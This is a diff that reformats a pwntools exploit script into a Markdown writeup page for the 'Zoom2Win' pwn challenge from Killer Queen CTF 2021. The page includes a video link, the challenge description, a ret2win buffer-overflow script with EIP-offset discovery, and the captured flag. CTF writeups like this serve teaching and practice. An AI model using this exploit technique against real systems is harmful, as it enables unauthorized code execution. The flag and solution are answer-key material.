@@ -1,5 +1,35 @@
-from pwn import *
+---
+name: Zoom2Win (2021)
+event: Killer Queen CTF 2021
+category: Pwn
+description: Writeup for Zoom2Win (pwn) - Killer Queen CTF (2021) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Zoom2Win
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/xOHLniVJsJY/0.jpg)](https://youtu.be/xOHLniVJsJY?t=707s "Killer Queen 2021: Zoom2Win")
+
+## Challenge Description
+
+> What would CTFs be without our favorite ret2win
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +39,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 def find_eip(payload):
     # Launch process and send payload
@@ -22,7 +51,6 @@ def find_eip(payload):
     info('located EIP offset at {a}'.format(a=eip_offset))
     # Return the EIP offset
     return eip_offset
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -62,3 +90,6 @@ io.recvline()
 # Get our flag!
 flag = io.recv()
 success(flag)
+```
+
+Flag: `kqctf{did_you_zoom_the_basic_buffer_overflow_?}`
